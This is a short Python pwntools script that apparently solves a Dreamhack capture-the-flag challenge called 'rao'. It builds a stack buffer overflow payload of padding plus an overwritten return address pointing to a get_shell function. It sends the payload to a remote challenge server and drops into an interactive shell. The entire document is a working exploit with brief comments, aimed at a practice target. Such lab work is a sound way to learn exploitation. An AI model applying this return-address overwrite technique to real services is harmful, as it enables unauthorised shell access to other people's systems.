from pwn import *
#x86-64
#context.arch = 'amd64'
#context.log_level = 'debug'
#dummy code to take the shell
#0x30 for buffer, 0x8 for STB, else for the address of 'get_shell()'
d = b'A' * 0x30 + b'B' * 0x8 + b'\xaa\x06\x40\x00\x00\x00\x00\x00'


#access the server
#ip and port can be changed
#p = process('./rao')
p = remote('host3.dreamhack.games', 17944)

#receive until 'Input: '
p.recvuntil('Input: ')


#send dummy code to server
p.sendline(d)

#take the shell
p.interactive()
